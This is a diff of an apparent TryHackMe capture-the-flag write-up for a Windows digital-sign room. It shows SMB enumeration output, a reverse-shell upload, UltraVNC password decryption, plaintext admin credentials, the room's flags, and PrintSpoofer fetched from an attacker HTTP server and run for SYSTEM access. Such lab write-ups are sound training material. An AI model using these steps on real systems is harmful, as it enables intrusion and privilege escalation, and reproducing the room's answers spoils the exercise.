@@ -4,7 +4,6 @@ A room that contains a rushed Windows based Digital Sign system. Can you breach 
 
 ![222](https://tryhackme-images.s3.amazonaws.com/room-icons/a5b0f0ea5a8dc33948e69e28c3cc4303.jpeg)
 
-
 ### Enumeration
 
  Start Machine
@@ -258,13 +257,9 @@ Username ......... 'guest'
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-
  ============================( Enumerating Workgroup/Domain on 10.10.76.135 )============================
 
-
 [E] Can't find workgroup/domain
-
-
 
  ================================( Nbtstat Information for 10.10.76.135 )================================
 
@@ -273,9 +268,7 @@ No reply from 10.10.76.135
 
  ===================================( Session Check on 10.10.76.135 )===================================
 
-
 [+] Server 10.10.76.135 allows sessions using username 'guest', password ''
-
 
  ================================( Getting domain SID for 10.10.76.135 )================================
 
@@ -284,19 +277,15 @@ Domain Sid: (NULL SID)
 
 [+] Can't determine if host is part of domain or part of a workgroup
 
-
  ===================================( OS information on 10.10.76.135 )===================================
 
-
 [E] Can't get OS info with smbclient
-
 
 [+] Got OS info for 10.10.76.135 from srvinfo: 
 	10.10.76.135   Wk Sv NT             
 	platform_id     :	500
 	os version      :	10.0
 	server type     :	0x1003
-
 
  =======================================( Users on 10.10.76.135 )=======================================
 
@@ -336,10 +325,7 @@ NT_STATUS_NO_SUCH_FILE listing \*
 
  ============================( Password Policy Information for 10.10.76.135 )============================
 
-
 [E] Unexpected error from polenum:
-
-
 
 [+] Attaching to 10.10.76.135 using guest
 
@@ -351,35 +337,23 @@ NT_STATUS_NO_SUCH_FILE listing \*
 
 	[!] Protocol failed: rpc_s_access_denied
 
-
-
 [E] Failed to get password policy with rpcclient
-
-
 
  =======================================( Groups on 10.10.76.135 )=======================================
 
-
 [+] Getting builtin groups:
-
 
 [+]  Getting builtin group memberships:
 
-
 [+]  Getting local groups:
-
 
 [+]  Getting local group memberships:
 
-
 [+]  Getting domain groups:
-
 
 [+]  Getting domain group memberships:
 
-
  ==================( Users on 10.10.76.135 via RID cycling (RIDS: 500-550,1000-1050) )==================
-
 
 [I] Found new SID: 
 S-1-5-21-201290883-77286733-747258586
@@ -407,7 +381,6 @@ S-1-5-21-201290883-77286733-747258586
 
 [+] Enumerating users using SID S-1-5-90 and logon username 'guest', password ''
 
-
 [+] Enumerating users using SID S-1-5-32 and logon username 'guest', password ''
 
 S-1-5-32-544 BUILTIN\Administrators (Local Group)
@@ -434,8 +407,6 @@ smb: \> ls
   man-1459246_1280.png                A   363259  Sun Jan 10 16:50:49 2021
   monitor-1307227_1920.jpg            A   691570  Sun Jan 10 16:50:29 2021
   neon-sign-4716257_1920.png          A  1461192  Sun Jan 10 16:53:59 2021
-
-
 
 http://10.10.253.118/images/
 
@@ -467,7 +438,6 @@ Fatal error: Unknown: Failed opening required 'C:/xampp/htdocs/images/shell_pwn.
 uhmm another revshell
 
 https://www.revshells.com/ (PHP Ivan Sincek)
-
 
 ─$ cat payload_ivan.php 
 <?php
@@ -582,9 +552,7 @@ C:\Users\sign\Desktop>dir
 C:\Users\sign\Desktop>type user_flag.txt
 thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}
 
-
 ```
-
 
 How many TCP ports under 1024 are open?
 
@@ -676,7 +644,6 @@ HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\Volatil
 
 This key contains settings related to the Windows logon process.
 
-
 In PowerShell, the "gc" (or "get-content") command is used to retrieve the contents of a text file. For example, if you want to view the contents of a file called "example.txt" you would use the following command:
 
 `gc example.txt`
@@ -687,16 +654,12 @@ This command will display the contents of the file in the PowerShell console. Ad
 
 You can also use wildcards to specify multiple files and even use it with pipes to filter the output
 
-
 `gc .\*.log | Where-Object {$_ -like "*error*"}`
-
 
 PS C:\Users\sign\Desktop> cd C:\installs
 PS C:\installs> dir
 
-
     Directory: C:\installs
-
 
 Mode                LastWriteTime         Length Name                                                                  
 ----                -------------         ------ ----                                                                  
@@ -709,7 +672,6 @@ d-----       14/11/2020     14:28                simepleslide
 -a----       14/11/2020     14:43           1292 ultravnc.ini                                                          
 -a----       14/11/2020     14:00        3129968 UltraVNC_1_2_40_X64_Setup.exe                                         
 -a----       14/11/2020     13:59      162450672 xampp-windows-x64-7.4.11-0-VC15-installer.exe 
-
 
 PS C:\installs> gc ins*.bat
 @echo off
@@ -865,14 +827,12 @@ longer than 8 chars)
 
 Wine is a compatibility layer that allows Windows applications to run on Linux and other Unix-like operating systems. The command you provided is using Wine to run the "vncpwd.exe" application, and passing it the argument "B3A8F2D8BEA2F1FA70". This is likely a VNC (Virtual Network Computing) password that is being passed to the "vncpwd.exe" application in order to be decrypted.
 
-
 ──(kali㉿kali)-[~/Downloads]
 └─$ xfreerdp /v:10.10.77.222 /u:Administrator /p:5upp0rt9 /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp /size:85%
 [18:45:24:434] [2314355:2314356] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: STATUS_LOGON_FAILURE [0xC000006D] from server
 [18:45:24:434] [2314355:2314356] [ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE [0x00020014]
 [18:45:24:434] [2314355:2314356] [ERROR][com.freerdp.core.rdp] - rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu() fail
 [18:45:24:434] [2314355:2314356] [ERROR][com.freerdp.core.transport] - transport_check_fds: transport->ReceiveCallback() - -1
-
 
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ evil-winrm -i 10.10.77.222 -u Administrator -p 5upp0rt9
@@ -922,7 +882,6 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 SeTimeZonePrivilege           Change the time zone                      Disabled
 
-
 ┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
 └─$ locate PrintSpoof
 /home/kali/ra2/PrintSpoofer.exe
@@ -937,7 +896,6 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.77.222 - - [23/Jan/2023 19:02:26] "GET /PrintSpoofer.exe HTTP/1.1" 200 -
 
 PS C:\Installs> Invoke-WebRequest "http://10.8.19.103:8000/PrintSpoofer.exe" -outfile PrintSpoofer.exe
-
 
 PS C:\Installs> ./PrintSpoofer.exe -i -c cmd
 [+] Found privilege: SeImpersonatePrivilege
@@ -971,7 +929,6 @@ It is important to note that this command is running a file called PrintSpoofer.
 
 ```
 
-
 What is the Users Password?
 
 The user is automatically logged into the computer
@@ -994,8 +951,6 @@ There are a few versions but some do not work. The version here is known to work
 
 *5upp0rt9*
 
-![[Pasted image 20230123185003.png]]
-
 What is the contents of the admin_flag.txt?
 
 On the users desktop
@@ -1011,6 +966,5 @@ I would like to thank [BigMark82](https://tryhackme.com/p/bigmark82) and [Roc
 Answer the questions below
 
 READ IT
-
 
 [[OWASP API Security Top 10 - 1]]
